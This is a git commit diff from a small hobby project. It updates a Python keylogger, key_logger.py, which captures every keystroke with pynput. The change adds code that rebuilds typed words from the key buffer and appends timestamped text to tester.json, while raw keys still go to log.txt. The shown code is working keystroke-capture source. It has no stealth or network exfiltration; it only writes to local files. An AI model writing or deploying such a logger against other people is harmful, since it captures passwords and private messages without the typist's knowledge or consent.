7e81f17eee65351b3df89e4f42f34b79e5504267
LittleFinchy <57785785+LittleFinchy@users.noreply.github.com>
2020-07-17 00:02:07 -0400

    delete txt option
    json is starting to work so i can get rid of the txt option

--- key_logger.py
+++ key_logger.py
@@ -3,24 +3,32 @@ from pynput.keyboard import Key, Listener
 from datetime import datetime
 import json
 
-count, keys, fianl_log = 0, [], {'date': 'keys go here', 'date': 'did it work?', 'date': 'is it just doing the last one?'}
+count, keys, fianl_log = 0, [], {'date': 'keys go here', 'date1': 'did it work?', 'date2': 'is it just doing the last one?'}
 
 def on_press(key):
 	global keys, count
 	keys.append(key)
 	count += 1
-	
-	if count >= 1: #change to a bigger number for the final version
+
+	if count > 20 and 'space' in str(keys[-1]): #change to a bigger number for the final version
+		words = ''
+		for key in keys:
+			k = str(key).replace("'", '')
+			if k.find('space') > 0:
+				words += ' '
+			elif k.find('Key') == -1:
+				words += k
+			else:
+				pass #words += ' '+k[4:]+' '
 		write_file(keys)
-		write_log(fianl_log)
+		write_log({str(datetime.now()): words})
 		count, keys = 0, []
 
 
-
-def write_log(fianl_log):
-	with open("tester.json", "w") as jf: 
-		json.dump(fianl_log, jf)
-
+def write_log(input_):
+	with open("tester.json", "a") as jf: 
+		json.dump(input_, jf)
+		
 
 def write_file(keys):
 	with open('log.txt', 'a') as f:
